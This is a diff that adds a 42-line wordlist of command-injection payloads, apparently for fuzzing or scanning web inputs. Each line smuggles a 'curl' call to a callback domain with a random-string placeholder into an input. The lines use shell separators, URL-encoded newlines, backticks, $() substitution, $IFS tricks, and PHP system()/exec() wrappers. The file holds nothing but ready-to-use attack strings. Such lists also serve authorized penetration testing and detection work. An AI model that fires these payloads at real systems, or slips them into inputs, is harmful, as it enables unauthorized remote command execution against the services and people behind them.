@@ -1,0 +1,42 @@
+%0Acurl%20rce___RANDOM_STR__.xxx-trulia.com
+%0Acurl rce___RANDOM_STR__.xxx-trulia.com
+%0a curl rce___RANDOM_STR__.xxx-trulia.com %0a
+%0Acurl rce___RANDOM_STR__.xxx-trulia.com%0A
+|curl rce___RANDOM_STR__.xxx-trulia.com
+;curl rce___RANDOM_STR__.xxx-trulia.com
+;curl rce___RANDOM_STR__.xxx-trulia.com|
+;curl rce___RANDOM_STR__.xxx-trulia.com;
+;curl$IFSrce___RANDOM_STR__.xxx-trulia.com;
+)|curl rce___RANDOM_STR__.xxx-trulia.com
+)|curl rce___RANDOM_STR__.xxx-trulia.com;
+);curl rce___RANDOM_STR__.xxx-trulia.com
+);curl rce___RANDOM_STR__.xxx-trulia.com|
+);curl rce___RANDOM_STR__.xxx-trulia.com;
+`curl rce___RANDOM_STR__.xxx-trulia.com`
+||curl rce___RANDOM_STR__.xxx-trulia.com|
+||curl rce___RANDOM_STR__.xxx-trulia.com;
+||curl$IFSrce___RANDOM_STR__.xxx-trulia.com;
+| curl rce___RANDOM_STR__.xxx-trulia.com
+|curl rce___RANDOM_STR__.xxx-trulia.com
+|curl rce___RANDOM_STR__.xxx-trulia.com|
+|curl rce___RANDOM_STR__.xxx-trulia.com;
+;|curl rce___RANDOM_STR__.xxx-trulia.com|
+; curl rce___RANDOM_STR__.xxx-trulia.com
+;curl rce___RANDOM_STR__.xxx-trulia.com
+;curl rce___RANDOM_STR__.xxx-trulia.com|
+;curl rce___RANDOM_STR__.xxx-trulia.com;
+$;curl rce___RANDOM_STR__.xxx-trulia.com
+$(curl rce___RANDOM_STR__.xxx-trulia.com)
+& curl rce___RANDOM_STR__.xxx-trulia.com
+%26 curl rce___RANDOM_STR__.xxx-trulia.com %26
+;curl rce___RANDOM_STR__.xxx-trulia.com\n
+\ncurl rce___RANDOM_STR__.xxx-trulia.com|
+\ncurl rce___RANDOM_STR__.xxx-trulia.com;
+|ncurl rce___RANDOM_STR__.xxx-trulia.com\n
+\ncurl rce___RANDOM_STR__.xxx-trulia.com\n
+;system('curl rce___RANDOM_STR__.xxx-trulia.com')
+;exec('curl%20rce___RANDOM_STR__.xxx-trulia.com')
+|curl rce___RANDOM_STR__.xxx-trulia.com\n
+`curl rce___RANDOM_STR__.xxx-trulia.com`
+%0acurl rce___RANDOM_STR__.xxx-trulia.com%0a
+&curl rce___RANDOM_STR__.xxx-trulia.com&
